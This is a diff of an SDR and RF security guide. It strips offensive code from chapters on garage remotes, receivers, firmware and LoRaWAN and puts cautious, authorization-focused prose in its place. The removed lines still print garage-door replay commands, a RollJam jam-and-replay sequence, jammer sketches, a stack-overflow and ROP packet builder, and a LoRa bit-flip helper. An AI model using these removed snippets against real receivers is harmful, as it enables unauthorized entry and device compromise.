-        crc16 = crcmod.predefined.mkCrcFun('crc-16')
-        crc = crc16(bytes(packet[data_start:data_end]))
-        struct.pack_into('>H', packet, crc_offset, crc)
-        return packet
-    
-    def generate_corpus(self, n_packets: int = 1000, 
-                         strategy: str = 'mixed') -> list:
-        """Generate a fuzzing corpus"""
-        corpus = []
-        for i in range(n_packets):
-            packet = bytearray(self.baseline)
-            
-            if strategy == 'bitflip' or (strategy == 'mixed' and i % 3 == 0):
-                packet = self.bitflip(packet, n_bits=random.randint(1, 8))
-            elif strategy == 'substitute' or (strategy == 'mixed' and i % 3 == 1):
-                start = random.randint(1, len(packet)-2)
-                end = random.randint(start+1, len(packet)-1)
-                packet = self.byte_substitute(packet, start, end)
-            else:
-                # Random byte appended or truncated
-                if random.random() > 0.5:
-                    packet.append(random.randint(0, 255))
-                elif len(packet) > 3:
-                    packet = packet[:-1]
-            
-            corpus.append(bytes(packet))
-        return corpus
-
-# Example usage:
-# fuzzer = RFPacketFuzzer(baseline_packet=b'\xAA\xAA\xD3\x91\x40\x00\xFF\x12\x34\xAB\xCD')
-# corpus = fuzzer.generate_corpus(1000)
-# for packet in corpus:
-#     modulate_and_transmit(packet)  # via HackRF
-#     response = monitor_target(timeout=0.5)
-#     if response == 'crash' or response == 'unexpected':
-#         save_crash(packet)
-```
+Before any hardware fuzzing, define an offline parser harness, mutation boundaries, target reset strategy and independent behavior observation. The diagram above is an architecture sketch, not a validated transmitter or crash-reproduction recipe.
 
 **GNU Radio-based fuzzer flowgraph:**
 
@@ -831,7 +461,7 @@ class RFPacketFuzzer:
 
 ### Chapter 6: Reverse Engineering Remote Controls
 
-Remote controls are ideal training targets - commonly available, no ongoing service dependency, clear success criterion (device responds to forged signal).
+An owned disposable remote/receiver pair can support a controlled study, but operational remotes may have state and pairing dependencies. Begin with receive-only observations rather than using a production door as a test harness.
 
 #### The Remote Control Attack Chain
 
@@ -846,176 +476,54 @@ Remote controls are ideal training targets - commonly available, no ongoing serv
 
 #### Step-by-Step: Garage Door Opener RE
 
-**Target characteristics:** Most North American garage doors operate on 315 MHz or 390 MHz (older) or 433.92 MHz (newer). Common modulations: OOK (PWM or on/off), FSK. Older fixed-code remotes are trivially replayable; rolling-code (KeeLoq) requires more sophistication.
+**Target characteristics:** Check the exact model, regional documentation and receiver configuration. Frequency and manufacture date alone do not establish fixed versus rolling-code behavior.
 
-```bash
-# Step 1: Find the frequency
-# Check FCC ID database: fccid.io - search the FCC ID on the remote label
-# This gives frequency, modulation type, sometimes internal photos
-
-# Step 2: Capture
-rtl_sdr -f 315000000 -s 250000 -g 50 -n 2500000 capture_315.cu8
-# Press button during capture (2.5M samples = 10 seconds)
-
-# Step 3: Inspect with inspectrum
-inspectrum capture_315.cu8 -r 250000
-
-# Step 4: Measure
-# In inspectrum: zoom to a single button press
-# Measure pulse widths: short pulse vs long pulse
-# Short = 300μs, Long = 600μs → PWM encoding (short=0, long=1) or vice versa
-
-# Step 5: Decode
-rtl_433 -r capture_315.cu8 -f 315M -A  # Auto-analyze; may identify make/model
-```
+For an owned garage remote, compare complete aligned frames across labeled button events and receiver state. Repeated fields and changing fields are hypotheses; use the receive-only exercise in [the Sub-GHz guide](./subghz.md) before considering separately scoped acceptance testing.
 
 **PWM (Pulse Width Modulation) decoding:**
 
-```python
-import numpy as np
-from scipy.signal import find_peaks
-
-def decode_ook_pwm(iq_samples, sample_rate, 
-                    short_pulse_us=300, long_pulse_us=600):
-    """
-    Decode OOK PWM encoding.
-    Short pulse = '0', Long pulse = '1' (or vice versa - need to determine empirically)
-    """
-    # Get envelope (magnitude of complex signal)
-    envelope = np.abs(iq_samples)
-    
-    # Threshold to get binary signal
-    threshold = (np.max(envelope) + np.min(envelope)) / 2
-    binary = (envelope > threshold).astype(int)
-    
-    # Find transitions
-    edges = np.diff(binary)
-    rising_edges = np.where(edges == 1)[0]
-    falling_edges = np.where(edges == -1)[0]
-    
-    # Measure pulse widths
-    bits = []
-    short_samples = int(short_pulse_us * 1e-6 * sample_rate)
-    long_samples  = int(long_pulse_us  * 1e-6 * sample_rate)
-    tolerance = 0.3  # 30% tolerance
-    
-    for i, rising in enumerate(rising_edges):
-        if i < len(falling_edges):
-            pulse_width = falling_edges[i] - rising
-            
-            if abs(pulse_width - short_samples) < short_samples * tolerance:
-                bits.append(0)
-            elif abs(pulse_width - long_samples) < long_samples * tolerance:
-                bits.append(1)
-            else:
-                bits.append(-1)  # Unknown width
-    
-    return bits
-
-def bits_to_hex(bits):
-    """Convert list of bits to hex string"""
-    # Pad to multiple of 8
-    while len(bits) % 8:
-        bits.append(0)
-    
-    hex_str = ''
-    for i in range(0, len(bits), 8):
-        byte = 0
-        for j, bit in enumerate(bits[i:i+8]):
-            byte |= (bit << (7 - j))
-        hex_str += f'{byte:02X}'
-    return hex_str
-```
+A pulse-width decoder needs robust thresholding, matched rising/falling edges, frame-boundary handling, symbol tolerances and an explicit unknown state. The previous edge-index pairing could produce negative widths, and padding unknown bits into hex could silently corrupt evidence.
 
 ---
 
 #### Fixed Code vs. Rolling Code
 
-**Fixed code systems:** The same bit pattern is transmitted every button press. Trivially vulnerable to replay.
+Static messages may be replayable if the receiver accepts repeated content without
+freshness checks. Repeated captured bytes do not establish indefinite acceptance.
+Rolling-code designs combine cryptographic validity with receiver state, but key
+provisioning, synchronization and implementation remain part of the assessment.
 
-```bash
-# Record a button press
-hackrf_transfer -r door_open.iq -f 315000000 -s 2000000 -g 40 -l 32 -n 2000000
+Relay, capture-and-delay and cryptanalytic attacks are different mechanisms with
+different prerequisites. Relaying extends communication; it is still an RF path,
+not "no RF attack." A historical attack's required observations do not establish a
+universal button-press count or manufacturer-key extraction method. See the
+[Microchip HCS301 design description](https://ww1.microchip.com/downloads/en/devicedoc/21143c.pdf)
+for one code-hopping implementation, not assurance about every deployed system.
 
-# Replay it (authorized testing only)
-hackrf_transfer -t door_open.iq -f 315000000 -s 2000000 -x 40 -a 1
-```
-
-**Rolling code (KeeLoq):** Each button press generates a new code using a keyed block cipher (KeeLoq). The receiver accepts only codes in a forward window from the last used counter value.
-
-**KeeLoq weaknesses:**
-
-1. **Relay/amplification attack:** No RF attack needed - extend the range of the legitimate fob signal to the receiver without capturing any code.
-
-2. **MitM desync attack ("RollJam"):** Jam the receiver while capturing the code; victim presses button twice; you have two valid codes. First captured code is never consumed by the receiver. Replay first code; victim thinks it worked (second code opened it); you use the captured second code later.
-
-3. **Cryptanalytic attack:** KeeLoq has known weaknesses; with 65,536 button presses from the same fob (or similar), the 64-bit manufacturer key can be extracted. Practical for research, not casual attack.
-
-```
-RollJam attack flow:
-  1. Attacker device jams the frequency
-  2. Victim presses button → code1 transmitted but jammed; receiver never sees it
-     Attacker captures code1
-  3. Victim presses button again → code2 transmitted but jammed
-     Attacker captures code2
-     Attacker immediately replays code1 → receiver opens; victim satisfied
-  4. Attacker now holds code2 - valid unused code
-  5. Later: attacker replays code2 → opens device
-```
-
----
+A controlled study should report product revision, observed message behavior,
+receiver acceptance and recovery conditions separately. This guide does not provide
+a jamming/replay sequence or claim a reproduced bypass.
 
 ### Chapter 7: Attacking Receivers
 
-The receiver is often more vulnerable than the transmitter - it must accept and process all incoming signals on its operating frequency.
+Receiver-side processing can expose weaknesses in parsing, state handling and
+authorization, but it need not process every RF event into an accepted message.
+Filtering, synchronization and authentication form additional boundaries.
 
 #### Jamming
 
-Jamming denies service by flooding the target frequency with noise or interference.
-
-| Jamming Type | Method | Detection Difficulty |
-|-------------|--------|---------------------|
-| **Spot jamming** | Continuous wave or noise on exact frequency | Easy - energy always present |
-| **Sweep jamming** | Sweep across a band | Medium |
-| **Barrage jamming** | Noise across wide band | Easy - raises noise floor everywhere |
-| **Reactive jamming** | Detect-then-jam; only active when target signal present | Hard - appears as interference |
-| **Deceptive jamming** | Transmit valid-looking but incorrect data | Hard - target appears to function |
-
-```python
-# GNU Radio: simple spot jammer (authorized jamming/testing lab only)
-# Flowgraph:
-# [Signal Source: noise] → [Multiply Const (power)] → [osmocom Sink]
-
-# More sophisticated: reactive jammer
-# [osmocom Source] → [Power Squelch] → [trigger_on_signal]
-#                                              │
-#                                     [Start noise TX on detection]
-```
+Interference can deny availability. Continuous, swept, wideband and reactive energy
+can have different effects; labels such as "easy" or "hard" detection are not
+portable measurements. Evaluate receiver health with permitted, controlled lab
+conditions and independent observations; do not treat unexplained packet loss as
+proof of intentional jamming.
 
 #### Signal Injection and Spoofing
 
-Rather than blocking the receiver, inject a malicious but valid-looking signal.
-
-**Replay attack:** Re-transmit a previously captured valid packet.
-
-**Crafted packet injection:** Construct a packet from scratch using reverse-engineered protocol knowledge.
-
-**Signal level attacks:**
-
-```python
-# AGC saturation attack: transmit a very strong signal on the target frequency
-# Goal: saturate the receiver's AGC, making it temporarily deaf
-# When AGC recovers, inject your packet
-
-# More sophisticated: inject while AGC is saturated so legitimate signal is missed
-# This requires precise timing relative to transmitted packet bursts
-```
-
-**Frequency deviation attack:**
-
-Some FSK receivers have finite discrimination windows. Transmitting at a frequency slightly off from the expected center can cause misdetection or undefined behavior in poorly designed receivers.
-
----
+A captured frame, a well-formed packet and an accepted command are different
+findings. Test parser correctness offline first. RF acceptance testing needs a
+separate authorized setup with verified containment and recovery. Modulation and
+checksum reproduction do not automatically reproduce sender authentication.
 
 ### Chapter 8: Reversing Custom Signals
 
@@ -1060,124 +568,13 @@ Phase 5: Forgery
 
 Capture the same action multiple times; capture different actions; compare.
 
-```python
-def differential_analysis(packets: list[bytes]) -> dict:
-    """
-    Compare multiple packets to find constant vs. variable fields.
-    
-    Returns dict:
-      'constant': byte indices that never change
-      'variable': byte indices that change across packets
-      'changing_fields': byte indices with values across all packets
-    """
-    if not packets:
-        return {}
-    
-    max_len = max(len(p) for p in packets)
-    
-    constant_fields = []
-    variable_fields = []
-    
-    for byte_idx in range(max_len):
-        values = set()
-        for packet in packets:
-            if byte_idx < len(packet):
-                values.add(packet[byte_idx])
-        
-        if len(values) == 1:
-            constant_fields.append(byte_idx)
-        else:
-            variable_fields.append(byte_idx)
-    
-    # Show what's at each position
-    print("Byte | Constant? | Values seen")
-    print("-" * 50)
-    for byte_idx in range(max_len):
-        values = [p[byte_idx] if byte_idx < len(p) else None for p in packets]
-        unique = set(v for v in values if v is not None)
-        const = "YES" if len(unique) == 1 else "no"
-        hex_vals = ' '.join(f'{v:02X}' for v in sorted(unique) if v is not None)
-        print(f"  {byte_idx:3d}  |    {const}    | {hex_vals}")
-    
-    return {
-        'constant': constant_fields,
-        'variable': variable_fields,
-    }
-
-# Example:
-# packets = [bytes.fromhex(h) for h in [
-#     'AA AA D3 91 01 00 42 FF A1 B2',
-#     'AA AA D3 91 01 00 42 FF A2 B2',
-#     'AA AA D3 91 01 00 42 FF A3 B2',
-# ]]
-# differential_analysis(packets)
-# → Bytes 0-8 constant; byte 8 varies (counter or sequence field)
-```
+Compare aligned complete frames from controlled input changes. Constant and changing positions are observations, not proof of an identifier or counter; handle unequal lengths and missing data explicitly.
 
 #### CRC Identification and Calculation
 
 Finding the CRC algorithm used in a protocol:
 
-```python
-import crcmod
-
-def identify_crc(packets_with_known_crc: list[tuple[bytes, int]], 
-                  crc_algorithms: list[str] = None):
-    """
-    Try multiple CRC algorithms to find which one matches.
-    packets_with_known_crc: list of (data_bytes, expected_crc) tuples
-    """
-    if crc_algorithms is None:
-        crc_algorithms = [
-            'crc-8', 'crc-8-maxim', 'crc-16', 'crc-16-ccitt', 
-            'crc-16-mcrf4xx', 'crc-32', 'crc-32c',
-            'crc-16-dnp', 'crc-16-usb',
-        ]
-    
-    for algo in crc_algorithms:
-        try:
-            crc_fn = crcmod.predefined.mkCrcFun(algo)
-            matches = 0
-            for data, expected_crc in packets_with_known_crc:
-                calculated = crc_fn(data)
-                if calculated == expected_crc:
-                    matches += 1
-            
-            if matches == len(packets_with_known_crc):
-                print(f"CRC algorithm found: {algo}")
-                return algo
-            elif matches > 0:
-                print(f"Partial match ({matches}/{len(packets_with_known_crc)}): {algo}")
-        except Exception:
-            pass
-    
-    print("No standard CRC algorithm matched. May be custom or XOR-based.")
-    return None
-
-def brute_force_crc_poly(data: bytes, expected_crc: int, width: int = 8):
-    """
-    Brute-force a custom CRC polynomial (practical for 8-bit CRCs).
-    For 16-bit: search space is 65536; feasible.
-    For 32-bit: search space is 4B; requires GPU or long time.
-    """
-    for poly in range(0, 2**width):
-        for init in [0x00, 0xFF]:
-            for xor_out in [0x00, 0xFF]:
-                try:
-                    crc_fn = crcmod.mkCrcFun(
-                        poly | (1 << width),  # Add implicit leading 1
-                        initCrc=init,
-                        xorOut=xor_out,
-                        rev=False
-                    )
-                    if crc_fn(data) == expected_crc:
-                        print(f"Found: poly=0x{poly:02X}, init=0x{init:02X}, "
-                              f"xorOut=0x{xor_out:02X}")
-                        return poly, init, xor_out
-                except Exception:
-                    pass
-    return None
-```
+Treat candidate CRC matches as hypotheses. Verify coverage, byte order, bit reflection, width, polynomial, initial state and final XOR on multiple independent frames. An empty corpus or one matching sample cannot identify a CRC; a CRC is not sender authentication.
 
 ---
 
@@ -1196,38 +593,15 @@ Once a target device is identified, analyzing its firmware is often the fastest 
 | **Vendor source** | GPL compliance disclosure; FCC test firmware | Linux-based products |
 | **Binwalk extraction** | Decompress/carve firmware images | Combined images with multiple sections |
 
-```bash
-# Extract and analyze firmware
-binwalk -e firmware.bin          # Extract known formats
-binwalk -A firmware.bin          # Find architecture hints (ARM opcodes, etc.)
-binwalk -B firmware.bin          # Entropy analysis (high entropy = encrypted/compressed)
-strings firmware.bin | grep -E "(key|pass|secret|token|cred)" -i
-
-# If entropy is high throughout: encrypted
-# Look for key in bootloader (lower entropy section)
-# Or capture key material via JTAG/memory dump during runtime
-```
+Select supported extraction and entropy options from the installed [Binwalk documentation](https://github.com/ReFirmLabs/binwalk). High entropy can reflect compression, encryption or other data; it does not prove encryption. Run extractors on a disposable analysis environment and preserve the original image.
 
 #### Ghidra Setup for RF Firmware
 
-```bash
-# Install Ghidra
-# Download from: https://github.com/NationalSecurityAgency/ghidra
-# Requires Java 17+: sudo apt install openjdk-17-jdk
-
-# Launch
-./ghidraRun
-
-# Useful Ghidra plugins for RF firmware:
-# - SVD-Loader: imports CPU peripheral register definitions (from ARM CMSIS SVD files)
-#   Install via: CodeBrowser → File → Install Extensions
-# - Renesas-Info: adds register info for common RF SoCs  
-# - ghidra-firmware-utils: better handling of raw binary and UEFI/EFI
-```
+Follow the Java and extension requirements bundled with the exact [Ghidra release](https://github.com/NationalSecurityAgency/ghidra/blob/master/GhidraDocs/GettingStarted.md). A string or library-call cross-reference is a starting point for data-flow review, not automatic taint analysis or proof of a vulnerability.
 
 #### Analyzing RF Baseband Code in Ghidra
 
-The RF baseband in a device handles parsing and acting on received RF packets. This is where vulnerabilities live.
+Receive paths can contain parsing, state handling and authorization weaknesses. A suspicious function call alone does not prove an exploitable vulnerability.
 
 **Finding the RF receive handler:**
 
@@ -1247,63 +621,16 @@ Strategy 3: Interrupt handler
 Strategy 4: Known API patterns  
   If using a known RF chip (CC1101, nRF52, SX1276), find the chip's 
   receive callback function (documented in chip SDK)
-  e.g., for CC1101: search for 0xBF (SIDLE strobe command) to find radio control code
+  e.g., for CC1101: identify SPI command sequences from the exact data sheet rather than treating a single byte as a function signature to find radio control code
 ```
 
 **Common vulnerability patterns in RF baseband code:**
 
-```c
-// VULNERABLE: No bounds check on received length field
-void process_received_packet(uint8_t *rx_buf) {
-    uint8_t length = rx_buf[0];          // Length from untrusted packet!
-    uint8_t *payload = rx_buf + 1;
-    
-    memcpy(internal_buffer, payload, length);  // Buffer overflow if length > sizeof(internal_buffer)
-    // ↑ Classic stack/heap overflow via malicious RF packet
-}
-
-// VULNERABLE: Format string via received data
-void log_packet_info(uint8_t *packet_data) {
-    char log_buf[64];
-    sprintf(log_buf, (char*)packet_data);  // If packet_data contains format specifiers: exploit
-}
-
-// VULNERABLE: Integer overflow in length calculation
-void process_tlv_fields(uint8_t *data, uint16_t total_len) {
-    uint16_t offset = 0;
-    while (offset < total_len) {
-        uint16_t field_len = data[offset+1];     // Field length from packet
-        offset += 2 + field_len;                  // If field_len = 0xFFFF: integer overflow
-        // offset may wrap around; loop continues reading out of bounds
-    }
-}
-```
+Review length validation, buffer ownership, integer conversions and state transitions along an actual receive path. Demonstrate reachability and impact using a separately scoped harness rather than treating a suspicious copy operation as a confirmed vulnerability.
 
 **Ghidra Scripting to find vulnerable patterns:**
 
-```python
-# Ghidra script (Python): find memcpy calls where size comes from received data
-# Run via: Script Manager → New Script
-
-from ghidra.app.script import GhidraScript
-from ghidra.program.model.symbol import RefType
-
-class FindMemcpyVulns(GhidraScript):
-    def run(self):
-        fm = currentProgram.getFunctionManager()
-        
-        # Find all memcpy references
-        target_funcs = ['memcpy', 'memmove', 'strcpy', 'strcat', 'sprintf']
-        
-        for func_name in target_funcs:
-            syms = getSymbols(func_name, None)
-            for sym in syms:
-                refs = getReferencesTo(sym.getAddress())
-                for ref in refs:
-                    if ref.getReferenceType() == RefType.UNCONDITIONAL_CALL:
-                        print(f"Call to {func_name} at: {ref.getFromAddress()}")
-                        # TODO: trace size argument to check if taint flows from RX buffer
-```
+A Ghidra script can locate candidate call sites or data references for manual review. Validate its processor/language assumptions and trace input lengths and control flow before reporting a reachable bug.
 
 ---
 
@@ -1311,7 +638,7 @@ class FindMemcpyVulns(GhidraScript):
 
 #### Exploit Development for RF Targets
 
-RF baseband vulnerabilities are exploited by transmitting specially crafted RF packets. The attack surface is wireless - no physical connection required.
+Some parser flaws can be reached over a radio link; exploitability also depends on framing, authentication, reachability, memory protections and implementation. Static suspicion, a reproducible crash and controlled execution are distinct findings.
 
 **Exploit delivery pipeline:**
 
@@ -1339,353 +666,99 @@ RF baseband vulnerabilities are exploited by transmitting specially crafted RF p
 
 #### Stack Overflow via Malicious Packet - Walkthrough
 
-```python
-import struct
+The former overflow and ROP snippets assumed a fictional stack layout, gadget
+addresses, executable-memory policy and packet checksum. Those assumptions do not
+constitute a working exploit and are removed.
 
-# Scenario: discovered via Ghidra analysis that:
-# - Packet format: [sync: 2 bytes] [length: 1 byte] [data: N bytes] [CRC: 2 bytes]
-# - Receiver does: memcpy(stack_buffer[64], received_data, received_length)
-# - No bounds check on received_length
-# - MCU is ARM Cortex-M (little-endian)
-# - Stack buffer is at frame offset -0x40 from saved LR
+For an owned parser, document its input length, buffer capacity, integer arithmetic,
+state transitions, error paths and memory protections. Prefer an offline harness
+with explicit mappings and deterministic termination. An emulator fault may reflect
+missing peripherals, mappings or callbacks rather than a target bug. Hardware impact
+requires separate, scoped reproduction with a recovery plan.
 
-SYNC = b'\xAA\xD3'
-RETURN_ADDRESS = 0x08001234  # Address of shellcode or ROP gadget (from Ghidra)
-
-def build_exploit_packet(shellcode: bytes) -> bytes:
-    # Overflow the 64-byte buffer + overwrite saved LR on stack
-    # Stack layout (assuming simple frame): [buffer: 64] [saved_r7: 4] [saved_LR: 4]
-    
-    payload = b'A' * 64          # Fill buffer
-    payload += b'B' * 4          # Overwrite saved r7 (filler)
-    payload += struct.pack('<I', RETURN_ADDRESS)  # Overwrite saved LR → our target
-    payload += shellcode         # Shellcode after return address (if executable stack)
-    
-    length = len(payload)
-    
-    # Build full packet with forged length
-    import crcmod
-    crc16 = crcmod.predefined.mkCrcFun('crc-16')
-    packet_data = struct.pack('B', length) + payload
-    crc = crc16(packet_data)
-    
-    return SYNC + packet_data + struct.pack('>H', crc)
-
-# Transmit exploit packet via HackRF
-# hackrf_transfer -t exploit.iq -f [target_freq] -s [samp_rate] -x 40
-```
-
-**Constrained environments (no shellcode):** Most modern MCUs have XN (Execute Never) memory protections. Use Return-Oriented Programming (ROP):
-
-```python
-# ROP chain for ARM Cortex-M (Thumb mode)
-# Each gadget is a small sequence of instructions ending in POP {pc} or BX LR
-
-# Example: call a function with controlled arguments
-# Gadget 1: POP {r0, pc}  - loads r0 (first arg) and jumps
-# Gadget 2: Address of target function
-
-def build_rop_chain(target_func_addr, arg0):
-    """
-    Simple 1-argument ROP call on ARM Thumb.
-    Requires: gadget that does POP {r0, pc}
-    """
-    # Find "POP {r0, pc}" gadget in firmware using Ghidra or ROPgadget
-    POP_R0_PC = 0x08001ABC  # Example address from Ghidra analysis
-    
-    rop_chain  = struct.pack('<I', POP_R0_PC)      # Return to gadget
-    rop_chain += struct.pack('<I', arg0)            # Value for r0
-    rop_chain += struct.pack('<I', target_func_addr | 1)  # |1 for Thumb mode
-    
-    return rop_chain
-```
-
----
+No generic shellcode, return address or RF delivery recipe is provided here.
 
 ### Chapter 11: Industrial Protocols and LoRa
 
 #### LoRa / LoRaWAN Overview
 
-LoRa (Long Range) is a spread-spectrum modulation technique enabling low-power wide-area communication. LoRaWAN is the MAC-layer protocol built on top of LoRa.
+LoRa is a physical-layer modulation ecosystem; LoRaWAN defines networking and
+security behavior above it. A detected chirp does not establish a LoRaWAN version,
+application or compromise. CC1101 is not a LoRa demodulator.
 
-**Physical layer:**
-
-| Parameter | Description | Typical Values |
-|-----------|-------------|---------------|
-| **Spreading Factor (SF)** | Chips per symbol; SF7–SF12 | SF7 (fast) to SF12 (long range) |
-| **Bandwidth (BW)** | Channel bandwidth | 125, 250, 500 kHz |
-| **Coding Rate (CR)** | FEC overhead | 4/5, 4/6, 4/7, 4/8 |
-| **Frequency** | Regional bands | EU: 868 MHz; US: 915 MHz; AS: 923 MHz |
-
-**Air time vs. SF:**
-
-```
-SF7,  BW125, CR4/5 → ~36 ms / 20-byte payload  (short range, fast)
-SF12, BW125, CR4/5 → ~2 seconds / 20-byte payload (long range, slow)
-```
-
-Higher SF = longer air time = more power consumption = lower duty cycle compliance burden.
+Spreading factor is not itself the number of chips per symbol: in the usual LoRa
+model the symbol spans (2^{SF}) chips. Symbol time depends on spreading factor and
+bandwidth. Total airtime also depends on payload, coding, header, CRC and preamble
+settings; the former two unqualified airtime figures are omitted. Longer airtime
+generally consumes more duty-cycle budget, not less.
 
 #### LoRaWAN Security Architecture
 
-```
-Device (End Node)
-  ├── NwkSKey: 128-bit AES key - encrypts network header; MIC calculation
-  └── AppSKey: 128-bit AES key - encrypts application payload
+![LoRa physical transport, payload confidentiality, MIC and state checks are distinct roles](../assets/diagrams/advanced-sdr-lorawan-security-roles.svg)
 
-Network Server
-  └── NwkSKey (shared with device)
+*Figure 3 — Original conceptual diagram informed by the [LoRaWAN 1.0.4 specification](https://lora-alliance.org/wp-content/uploads/2021/11/LoRaWAN-Link-Layer-Specification-v1.0.4.pdf). Use the deployed version; this does not demonstrate decryption or a MIC bypass.*
 
-Application Server
-  └── AppSKey (shared with device; network server doesn't see plaintext payload)
-```
+Use the exact specification version. The familiar `NwkSKey` / `AppSKey` model is
+associated with LoRaWAN 1.0.x; 1.1 changes the network key structure. Session keys
+are derived during activation rather than carried as plaintext session keys in a
+join-accept. Headers are not all encrypted.
 
-**Join procedure (OTAA - Over-The-Air Activation):**
+Encryption and message integrity are separate checks. Altering ciphertext does not
+by itself bypass the message integrity code. This applies to unconfirmed uplinks too:
+"unconfirmed" does not mean "unauthenticated." A 32-bit MIC is not an AES-key crack
+and is not a weakness unique to Class B devices.
 
-```
-Device → Network:  Join Request  [DevEUI + AppEUI + DevNonce]
-Network → Device:  Join Accept   [AppNonce + NetID + DevAddr + encrypted session keys]
+#### Join procedure (OTAA - Over-The-Air Activation)
 
-Keys derived:
-  NwkSKey = AES128(AppKey, 0x01 || AppNonce || NetID || DevNonce || padding)
-  AppSKey = AES128(AppKey, 0x02 || AppNonce || NetID || DevNonce || padding)
-```
+Evaluate version-specific nonce, join/rejoin, counter persistence and reset behavior
+against the actual server and device. Reusing an observed request does not imply that
+the server accepts it, that keys become predictable, or that an attacker learns a
+root key.
 
 #### LoRa Signal Reception and Decoding
 
-```bash
-# gr-lora: GNU Radio LoRa receiver
-# Install
-sudo pip3 install gr-lora
-# or build from: https://github.com/rpp0/gr-lora
-
-# Capture LoRa signals
-# LoRa appears as a characteristic "chirp" on the waterfall
-# Up-chirp: frequency increases linearly over symbol period
-# Down-chirp: frequency decreases (used as preamble sync)
-
-# Real-time decode
-python3 -c "
-import osmosdr
-import lora  # gr-lora
-# Flowgraph: osmocom source → lora receiver → print packets
-"
-
-# ChirpStack (open-source LoRaWAN network server) for full stack analysis
-# https://www.chirpstack.io
-```
-
-**SX1276 LoRa demodulation in Python:**
-
-```python
-# ttn_decoder / loradecoder for offline analysis of captured LoRa IQ
-# pip install loratools
-
-# Or use SatDump's LoRa decoder for captured files
-```
+Use a compatible receiver and a version-matched, documented decoder. A network
+server such as ChirpStack consumes supported gateway traffic; it is not an arbitrary
+IQ decoder. The former pip package names and empty flowgraph sketches were not
+verified installation or decoding procedures.
 
 #### LoRaWAN Vulnerability Classes
 
-**1. Join Replay Attack**
+Review key provisioning and storage, nonce/counter handling, reset behavior,
+authorization and application logic. ABP activation does not imply that keys are
+necessarily recoverable from firmware, and a hex-looking string is only a candidate,
+not a verified secret. Root-key extraction, counter misuse and MIC verification
+failure require different evidence.
 
-```python
-# LoRaWAN OTAA join request replay
-# The Join Request contains a DevNonce - should be unique per join
-# Early LoRaWAN 1.0 spec: DevNonce was random (not counter)
-# Attack: replay captured Join Request if DevNonce not tracked by server
-
-# Capture Join Request during legitimate device join
-# Replay same Join Request → network server re-issues session keys
-# → session keys derived from same DevNonce = predictable if AppKey known
-```
-
-**2. Bit-Flip Attack on Unconfirmed Uplinks**
-
-LoRaWAN 1.0 uses AES-CTR for payload encryption. CTR mode is malleable - flipping a bit in the ciphertext flips the corresponding bit in plaintext.
-
-```python
-def flip_lora_payload_bit(encrypted_payload: bytes, 
-                            bit_position: int) -> bytes:
-    """
-    Flip a specific bit in a LoRaWAN encrypted payload.
-    Without knowing the key, this flips the corresponding plaintext bit.
-    Useful when you know the structure of the plaintext (e.g., command bytes).
-    """
-    byte_idx = bit_position // 8
-    bit_idx = bit_position % 8
-    
-    modified = bytearray(encrypted_payload)
-    modified[byte_idx] ^= (1 << bit_idx)
-    return bytes(modified)
-
-# Example: if you know byte 0 is a command byte (0=off, 1=on)
-# and you intercept an "off" command: flip the LSB to send "on"
-```
-
-**3. MIC Brute Force (Class B devices)**
-
-The 4-byte MIC (Message Integrity Code) is calculated using AES-CMAC. For LoRaWAN 1.0, only the first 4 bytes of the CMAC are used.
-
-```python
-import struct
-from Crypto.Cipher import AES
-from Crypto.Hash import CMAC
-
-def calculate_lora_mic(nwk_skey: bytes, mhdr: bytes, fhdr: bytes, 
-                        fport: bytes, frmpayload: bytes, 
-                        direction: int, devaddr: int, fcnt: int) -> bytes:
-    """
-    Calculate LoRaWAN 1.0 MIC.
-    B0 block construction per LoRaWAN spec.
-    """
-    msg = mhdr + fhdr + fport + frmpayload
-    
-    b0 = bytes([0x49, 0x00, 0x00, 0x00, 0x00,
-                direction,
-                devaddr & 0xFF, (devaddr >> 8) & 0xFF, 
-                (devaddr >> 16) & 0xFF, (devaddr >> 24) & 0xFF,
-                fcnt & 0xFF, (fcnt >> 8) & 0xFF, 0x00, 0x00,
-                0x00, len(msg)])
-    
-    cobj = CMAC.new(nwk_skey, ciphermod=AES)
-    cobj.update(b0 + msg)
-    return cobj.digest()[:4]
-
-def verify_mic(packet: bytes, nwk_skey: bytes) -> bool:
-    """Verify the MIC of a received LoRaWAN packet"""
-    # Parse packet structure
-    mhdr = packet[:1]
-    # ... parse FHDR, FCnt, FPort, FRMPayload ...
-    received_mic = packet[-4:]
-    
-    # Recalculate
-    calculated_mic = calculate_lora_mic(nwk_skey, ...)
-    return received_mic == calculated_mic
-```
-
-**4. ABP (Activation By Personalization) Key Extraction**
-
-ABP devices have hardcoded session keys. Extracting firmware reveals NwkSKey and AppSKey directly.
-
-```bash
-# In Ghidra: search for 16-byte arrays near LoRa API calls
-# CC1101-based LoRa nodes often have keys in .rodata section
-
-# strings + grep approach
-strings firmware.bin | grep -E "^[0-9A-Fa-f]{32}$"  # 128-bit hex keys
-```
+Specification details: [LoRaWAN 1.0.4](https://lora-alliance.org/wp-content/uploads/2021/11/LoRaWAN-Link-Layer-Specification-v1.0.4.pdf), [LoRaWAN 1.1](https://lora-alliance.org/resource_hub/lorawan-specification-v1-1/). Primary context: [LoRa Alliance security guidance](https://lora-alliance.org/resource_hub/lorawan-is-secure-but-implementation-matters/).
+No session-key recovery or bypass is demonstrated here.
 
 #### Fuzzing with Unicorn/Qiling
 
-Unicorn Engine and Qiling provide CPU emulation for running and fuzzing firmware without hardware:
-
-```python
-# Unicorn Engine: emulate ARM Cortex-M firmware function
-from unicorn import *
-from unicorn.arm_const import *
-
-def emulate_packet_parser(firmware_bytes: bytes, 
-                           parse_func_addr: int,
-                           test_packet: bytes):
-    """
-    Emulate a firmware packet parsing function with a test packet.
-    Useful for fuzzing without needing the actual hardware.
-    """
-    # Initialize ARM Thumb emulator
-    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
-    
-    # Map firmware
-    FLASH_BASE = 0x08000000
-    mu.mem_map(FLASH_BASE, 0x100000)  # 1MB flash
-    mu.mem_write(FLASH_BASE, firmware_bytes)
-    
-    # Map RAM
-    RAM_BASE = 0x20000000
-    mu.mem_map(RAM_BASE, 0x10000)  # 64KB RAM
-    
-    # Write test packet to RAM
-    PACKET_ADDR = RAM_BASE + 0x1000
-    mu.mem_write(PACKET_ADDR, test_packet)
-    
-    # Set up registers: R0 = packet pointer, SP = stack top
-    mu.reg_write(UC_ARM_REG_R0, PACKET_ADDR)
-    mu.reg_write(UC_ARM_REG_SP, RAM_BASE + 0xF000)
-    
-    # Hook for crash detection
-    def hook_mem_invalid(uc, access, address, size, value, user_data):
-        print(f"[!] Memory fault: access={access:#x} addr={address:#x}")
-        uc.emu_stop()
